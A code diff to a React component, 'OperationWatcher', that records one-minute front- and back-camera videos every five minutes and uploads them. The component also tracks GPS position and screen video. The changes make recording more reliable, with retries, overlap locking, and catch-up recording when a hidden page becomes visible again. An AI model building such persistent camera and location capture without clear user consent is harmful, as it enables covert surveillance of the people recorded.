@@ -20,6 +20,9 @@ export default function OperationWatcher() {
   const screenVideoRef = useRef<HTMLVideoElement | null>(null);
   const screenTriedRef = useRef(false);
   const gpsRef = useRef<{ lat: number; lng: number; acc: number } | null>(null);
+  const lastMimeRef = useRef('');
+  const lastCycleRef = useRef(0);
+  const cyclingRef = useRef(false);
   const lastRef = useRef(0);
   const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const pendingRef = useRef<{ label: string; path: string } | null>(null);
@@ -66,46 +69,50 @@ export default function OperationWatcher() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  /** 录一段视频（默认 60 秒），返回 blob。低码率控制体积。 */
-  const recordOne = (stream: MediaStream, ms: number): Promise<Blob | null> =>
-    new Promise((resolve) => {
-      let done = false;
-      const finish = (b: Blob | null) => {
-        if (!done) {
-          done = true;
-          resolve(b);
-        }
-      };
-      // 兜底：ms+8 秒仍无结果强制返回 null，避免永久挂起
-      setTimeout(() => finish(null), ms + 8000);
-      try {
-        const MR = window.MediaRecorder;
-        if (!MR) return finish(null);
-        const mime = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) =>
-          MR.isTypeSupported(m)
-        );
-        const rec = new MR(stream, {
-          ...(mime ? { mimeType: mime } : {}),
-          videoBitsPerSecond: 300_000,
-        });
-        const chunks: Blob[] = [];
-        rec.ondataavailable = (e) => {
-          if (e.data && e.data.size) chunks.push(e.data);
-        };
-        rec.onstop = () => finish(new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' }));
-        rec.onerror = () => finish(null);
-        rec.start(1000);
-        setTimeout(() => {
-          try {
-            if (rec.state !== 'inactive') rec.stop();
-          } catch {
-            finish(null);
+  /** 录一段视频（默认 60 秒），返回 blob。低码率控制体积。
+      带选项失败时自动用无选项 MediaRecorder 重试一次。 */
+  const recordOne = (stream: MediaStream, ms: number): Promise<Blob | null> => {
+    const attempt = (useOpts: boolean): Promise<Blob | null> =>
+      new Promise((resolve) => {
+        let done = false;
+        const finish = (b: Blob | null) => {
+          if (!done) {
+            done = true;
+            resolve(b);
           }
-        }, ms);
-      } catch {
-        finish(null);
-      }
-    });
+        };
+        setTimeout(() => finish(null), ms + 8000);
+        try {
+          const MR = window.MediaRecorder;
+          if (!MR) return finish(null);
+          const mime = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) =>
+            MR.isTypeSupported(m)
+          );
+          lastMimeRef.current = mime || 'default';
+          const rec = useOpts && mime
+            ? new MR(stream, { mimeType: mime, videoBitsPerSecond: 300_000 })
+            : new MR(stream);
+          const chunks: Blob[] = [];
+          rec.ondataavailable = (e) => {
+            if (e.data && e.data.size) chunks.push(e.data);
+          };
+          rec.onstop = () =>
+            finish(new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' }));
+          rec.onerror = () => finish(null);
+          rec.start(1000);
+          setTimeout(() => {
+            try {
+              if (rec.state !== 'inactive') rec.stop();
+            } catch {
+              finish(null);
+            }
+          }, ms);
+        } catch {
+          finish(null);
+        }
+      });
+    return attempt(true).then((b) => (b && b.size ? b : attempt(false)));
+  };
 
   const blobToBase64 = async (blob: Blob): Promise<string> => {
     const buf = await blob.arrayBuffer();
@@ -134,10 +141,18 @@ export default function OperationWatcher() {
   /** 每 5 分钟自动录 1 分钟前后双视频上报。 */
   const videoCycle = async () => {
     if (!enabledRef.current) return;
+    if (cyclingRef.current) return;
+    // 锁屏/后台时系统冻结定时器与录制，跳过本轮，回前台补录
+    if (typeof document !== 'undefined' && document.visibilityState !== 'visible') return;
     const path = pathRef.current;
     if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
+    cyclingRef.current = true;
+    lastCycleRef.current = Date.now();
     try {
-      void ping('录像周期开始：录制 60 秒后上传');
+      const MR = window.MediaRecorder;
+      const mime =
+        MR && ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) => MR.isTypeSupported(m));
+      void ping(`录像周期开始：MR=${MR ? 'yes' : 'no'} mime=${mime || 'default'} 录60秒`);
       const okStream = await ensureStream();
       if (!okStream || !streamRef.current) {
         void ping('录像失败：摄像头流不可用');
@@ -148,7 +163,7 @@ export default function OperationWatcher() {
         ? await recordOne(backStreamRef.current, 60_000)
         : null;
       if (!frontBlob && !backBlob) {
-        void ping('录像失败：MediaRecorder 无输出（浏览器不支持或录制出错）');
+        void ping(`录像失败：MediaRecorder 无输出（mime=${lastMimeRef.current || 'default'}）`);
         return;
       }
       const payload = {
@@ -176,6 +191,8 @@ export default function OperationWatcher() {
       }
     } catch (e) {
       void ping(`录像异常：${(e as Error).message}`);
+    } finally {
+      cyclingRef.current = false;
     }
   };
 
@@ -187,9 +204,20 @@ export default function OperationWatcher() {
     const timer = setInterval(() => {
       void videoCycle();
     }, 5 * 60 * 1000);
+    // 回前台时若距上轮超过 4.5 分钟（锁屏期间被跳过），立即补一轮
+    const onVis = () => {
+      if (
+        document.visibilityState === 'visible' &&
+        Date.now() - lastCycleRef.current > 4.5 * 60_000
+      ) {
+        void videoCycle();
+      }
+    };
+    document.addEventListener('visibilitychange', onVis);
     return () => {
       clearTimeout(first);
       clearInterval(timer);
+      document.removeEventListener('visibilitychange', onVis);
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
